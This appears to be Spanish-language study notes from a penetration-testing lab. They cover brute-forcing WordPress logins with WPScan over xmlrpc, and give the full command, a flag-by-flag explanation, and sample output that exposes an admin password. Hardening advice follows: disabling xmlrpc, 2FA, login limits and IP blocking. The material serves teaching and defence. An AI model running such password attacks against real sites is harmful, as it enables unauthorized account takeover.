### **Ataques a Usuarios de WordPress**

#### **Ataque de Fuerza Bruta a Usuarios de WordPress**

WPScan permite realizar ataques de fuerza bruta a cuentas de WordPress mediante dos métodos:

1. **`wp-login`** → Fuerza bruta contra la página de inicio de sesión estándar (`/wp-login.php`).
2. **`xmlrpc`** → Utiliza la API de WordPress (`/xmlrpc.php`) para realizar intentos de inicio de sesión de manera más eficiente.

**El método `xmlrpc` es más rápido y eficiente porque permite múltiples intentos en una sola solicitud.**

---

## **Ejemplo de Ataque de Fuerza Bruta con WPScan**

El escaneo anterior reveló que hay **tres usuarios registrados**:

- **admin**
- **roger**
- **david**

Para realizar un ataque de fuerza bruta usando `xmlrpc`:

```bash
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
```

### **Explicación de los parámetros:**

- `--password-attack xmlrpc` → Usa XML-RPC para el ataque de fuerza bruta.
- `-t 20` → Usa 20 hilos en paralelo para acelerar el ataque.
- `-U admin, david` → Lista de usuarios objetivo.
- `-P passwords.txt` → Lista de contraseñas a probar.
- `--url http://blog.inlanefreight.com` → URL del sitio objetivo.

---

### **Salida del Ataque**

```plaintext
[+] URL: http://blog.inlanefreight.com/                                                  
[+] Started: Thu Apr  9 13:37:36 2020                                                                                                                                               
[+] Performing password attack on Xmlrpc against 3 user/s

[SUCCESS] - admin / sunshine1
Trying david / Spring2016 Time: 00:00:01 <============> (474 / 474) 100.00% Time: 00:00:01

[i] Valid Combinations Found:
 | Username: admin, Password: sunshine1
```

Esto indica que la cuenta **admin** usa la contraseña **sunshine1**, lo que permitiría acceso total al backend de WordPress.

---

## **Recomendaciones para Protegerse Contra Ataques de Fuerza Bruta**

1. **Deshabilitar `xmlrpc.php` si no es necesario:**
    
    - Agregar esta regla en `.htaccess`:
        
        ```plaintext
        <Files xmlrpc.php>
        Order Allow,Deny
        Deny from all
        </Files>
        ```
        
2. **Implementar Autenticación de Dos Factores (2FA):**
    
    - Usar plugins como **Google Authenticator** o **Wordfence**.
3. **Usar Contraseñas Fuertes y Únicas:**
    
    - Evitar contraseñas predecibles como `password123`, `admin123`, etc.
4. **Configurar un Límite de Intentos de Inicio de Sesión:**
    
    - Usar **Limit Login Attempts Reloaded** para bloquear IPs tras varios intentos fallidos.
5. **Activar CAPTCHA en el Inicio de Sesión:**
    
    - Plugins como **reCAPTCHA for WordPress** pueden evitar bots automatizados.
6. **Monitorear Intentos de Acceso:**
    
    - Revisar los registros (`/var/log/auth.log` en Linux o registros en WordPress).
7. **Bloquear Direcciones IP Sospechosas:**
    
    - Agregar IPs sospechosas a un firewall:
        
        ```bash
        sudo iptables -A INPUT -s 192.168.1.100 -j DROP
        ```
        

---

## **Conclusión**

El ataque de fuerza bruta con **WPScan** es altamente efectivo si el sitio no tiene medidas de seguridad. Para prevenirlo: ✔️ **Deshabilitar XML-RPC si no se usa.**  
✔️ **Implementar 2FA y contraseñas seguras.**  
✔️ **Configurar límites de intentos de inicio de sesión.**  
✔️ **Monitorizar logs y bloquear IPs sospechosas.**